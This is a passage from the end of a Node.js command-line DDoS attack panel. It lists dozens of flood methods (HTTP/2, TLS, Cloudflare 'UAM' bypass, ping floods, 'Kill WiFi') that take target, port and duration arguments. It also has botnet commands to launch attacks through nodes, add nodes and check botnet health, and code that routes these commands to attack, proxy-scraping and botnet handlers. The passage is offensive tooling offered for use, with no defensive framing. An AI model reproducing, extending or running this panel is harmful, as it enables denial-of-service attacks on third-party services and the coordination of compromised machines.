cibi      │ <T> <P> <D>        │ Cibi flood
cici      │ <T> <P> <D>        │ Cici flood
ciko      │ <T> <P> <D>        │ Ciko flood
coki      │ <T> <P> <D>        │ Coki flood
deathping │ <T> <P> <D>        │ Death ping
fire      │ <T> <P> <D>        │ Fire flood
flaybypass│ <T> <P> <D>        │ Flay bypass
flayingraw│ <T> <P> <D>        │ Flaying raw
flood     │ <T> <P> <D>        │ Flood
flood1    │ <T> <P> <D>        │ Flood-1
geckold   │ <T> <P> <D>        │ Geckold
glory     │ <T> <P> <D>        │ Glory flood
god       │ <T> <P> <D>        │ God flood
h2        │ <T> <P> <D>        │ H2 flood
h2-raw    │ <T> <P> <D>        │ H2 raw
H2-MERIS  │ <T> <P> <D>        │ H2 Meris
httpx     │ <T> <P> <D>        │ HTTPX flood
kill-do   │ <T> <P> <D>        │ Kill DO
kill-wifi │ <T> <P> <D>        │ Kill WiFi
maklo     │ <T> <P> <D>        │ Maklo flood
mixed     │ <T> <P> <D>        │ Mixed flood
ninja     │ <T> <P> <D>        │ Ninja flood
pidoras   │ <T> <P> <D>        │ Pidoras flood
ping      │ <T> <P> <D>        │ Ping flood
quantum   │ <T> <P> <D>        │ Quantum flood
raw       │ <T> <P> <D>        │ Raw flood
sad       │ <T> <P> <D>        │ Sad flood
sadboy    │ <T> <P> <D>        │ Sadboy flood
spampair  │ <T> <P> <D>        │ Spam pair
steven    │ <T> <P> <D>        │ Steven flood
storm     │ <T> <P> <D>        │ Storm flood
temp      │ <T> <P> <D>        │ Temp flood
thspeed   │ <T> <P> <D>        │ TH speed
thunder   │ <T> <P> <D>        │ Thunder flood
tls       │ <T> <P> <D>        │ TLS flood
uam       │ <T> <P> <D>        │ UAM flood
xin       │ <T> <P> <D>        │ Xin flood
xyn       │ <T> <P> <D>        │ Xyn flood
zxm       │ <T> <P> <D>        │ ZXM flood
botnet    │ <T> <D> <M>        │ Launch via botnet
addsrv    │ <Endpoint>         │ Add botnet node
botnet-test│ ----              │ Check botnet health
track-ip  │ <IP>               │ Geo IP lookup
`);
      return sigma();
    }

    if (command === 'methods') {
      console.log('Supported methods:\n' + METHODS.join(', '));
      return sigma();
    }

    if (command === 'proxy') {
      await scrapeProxy();
      console.log('Proxy list updated.');
      return sigma();
    }

    if (command === 'ongoing') {
      ongoingAttack();
      return sigma();
    }

    if (command === 'cls') {
      await banner();
      return sigma();
    }

    if (command === 'botnet') {
      await AttackBotnetEndpoints(args);
    } else if (command === 'addsrv') {
      await processBotnetEndpoint(args);
    } else if (command === 'botnet-test') {
      await checkBotnetEndpoints();
    } else if (command === 'track-ip') {
      await trackIP(args);
    } else if (METHODS.includes(command)) {
      await handleAttack(command, args);
    } else {
      console.log(`Command ${command} not found.`);
      sigma();
    }
  });
}

/*  ----------  cleanup on exit  ----------  */
process.on('exit', () => {
  try { fs.unlinkSync('proxy.txt'); } catch {}
  try { fs.unlinkSync('ua.txt'); } catch {}
});
process.on('SIGINT', () => process.exit());
process.on('SIGTERM', () => process.exit());

/*  ----------  kick-off  ----------  */
bootup();